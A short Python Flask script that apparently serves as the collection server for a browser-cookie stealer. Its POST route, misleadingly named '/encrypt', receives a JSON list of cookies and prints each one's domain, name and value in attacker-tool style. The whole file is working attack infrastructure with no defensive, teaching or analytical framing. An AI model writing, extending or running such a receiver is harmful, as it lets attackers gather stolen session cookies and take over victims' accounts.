from flask import Flask, request # type: ignore

app = Flask(__name__)

@app.route('/encrypt', methods=['POST'])
def home():
    for cookie in request.json:
        print(f"""
[+] Domain : {cookie['domain']}
    Name : {cookie['name']}
    Value : {cookie['value']}""")
        
    return "OK"

app.run(port=9001)